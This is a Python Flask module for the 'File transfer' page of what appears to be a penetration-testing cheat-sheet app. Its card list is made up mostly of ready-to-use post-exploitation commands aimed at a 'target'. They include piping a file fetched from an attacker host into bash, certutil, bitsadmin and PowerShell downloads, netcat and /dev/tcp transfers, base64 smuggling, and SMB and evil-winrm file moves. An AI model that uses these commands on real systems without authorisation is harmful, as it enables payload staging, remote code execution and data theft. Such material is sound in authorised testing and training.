from flask import Blueprint, render_template

bp = Blueprint("filetransfer", __name__)

CARDS = [
    {"title": "Serve from attacker ($LHOST)", "hint": "Host the file, then pull it from the target.", "blocks": [
        {"tpl": "python3 -m http.server 80", "lbl": "HTTP (cwd)"},
        {"tpl": "php -S 0.0.0.0:80", "lbl": "HTTP (php)"},
        {"tpl": "impacket-smbserver share . -smb2support", "lbl": "SMB share 'share'"},
        {"tpl": "impacket-smbserver share . -smb2support -user $USER -password $PASS", "lbl": "SMB (authenticated)"},
        {"tpl": "nc -lvnp $LPORT < file", "lbl": "netcat (send)"},
    ]},
    {"title": "Download — Linux target", "blocks": [
        {"tpl": "wget http://$LHOST/file -O /tmp/file"},
        {"tpl": "curl http://$LHOST/file -o /tmp/file"},
        {"tpl": "curl http://$LHOST/file | bash"},
        {"tpl": "nc $LHOST $LPORT > file", "lbl": "netcat (receive)"},
    ]},
    {"title": "Download — Windows target", "blocks": [
        {"tpl": "certutil -urlcache -f http://$LHOST/file file.exe"},
        {"tpl": 'powershell -c "iwr http://$LHOST/file -o file.exe"'},
        {"tpl": 'powershell -c "(New-Object Net.WebClient).DownloadFile(\'http://$LHOST/file\',\'file.exe\')"'},
        {"tpl": "bitsadmin /transfer job http://$LHOST/file %cd%\\file.exe"},
        {"tpl": "copy \\\\$LHOST\\share\\file .", "lbl": "from SMB share"},
    ]},
    {"title": "Over SSH", "hint": "When you have credentials.", "blocks": [
        {"tpl": "scp file $USER@$RHOST:/tmp/file"},
        {"tpl": "scp $USER@$RHOST:/remote/file ./file", "lbl": "pull back"},
    ]},
    {"title": "No tools — base64 paste", "hint": "Copy from attacker, paste on target.", "blocks": [
        {"tpl": "base64 -w0 file; echo", "lbl": "attacker: encode"},
        {"tpl": "echo <base64> | base64 -d > file", "lbl": "target: decode (linux)"},
        {"tpl": "certutil -encode file file.b64 & type file.b64", "lbl": "windows: encode"},
        {"tpl": "certutil -decode file.b64 file.exe", "lbl": "windows: decode"},
    ]},
    {"title": "No tools — /dev/tcp (linux, no wget/curl)", "blocks": [
        {"tpl": "exec 3<>/dev/tcp/$LHOST/$LPORT; echo -e 'GET /file HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3 > file", "plain": True},
    ]},
    {"title": "SMB with smbclient / evil-winrm", "blocks": [
        {"tpl": "smbclient //$RHOST/share -U $USER%$PASS -c 'get remote.txt'", "lbl": "pull"},
        {"tpl": "smbclient //$RHOST/share -U $USER%$PASS -c 'put local.txt'", "lbl": "push"},
        {"tpl": "upload local.exe / download remote.txt", "plain": True, "lbl": "inside evil-winrm"},
    ]},
]


@bp.route("/filetransfer")
def index():
    return render_template("cheat.html", active="filetransfer",
                           title="File transfer", tag="post-exploit",
                           intro="Get files on and off the target across platforms.",
                           cards=CARDS)


MODULE = {"id": "filetransfer", "title": "File transfer", "category": "Post-exploit",
          "order": 10, "blueprint": bp, "endpoint": "filetransfer.index"}
